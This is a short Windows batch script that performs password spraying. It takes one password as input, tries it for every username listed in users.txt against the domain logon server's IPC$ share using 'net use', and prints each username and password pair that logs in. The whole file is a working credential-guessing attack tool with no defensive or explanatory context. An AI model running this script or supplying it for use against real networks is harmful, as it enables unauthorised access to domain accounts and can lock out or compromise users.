@echo off
@set password=%1
@FOR /F "delims=" %%n in (users.txt) DO @(@net use %logonserver%\IPC$ /user:%userdomain%\%%n %password% 1>NUL 2>&1 && @echo [*] %%n:%password% && net use /delete %logonserver%\IPC$ > NUL)
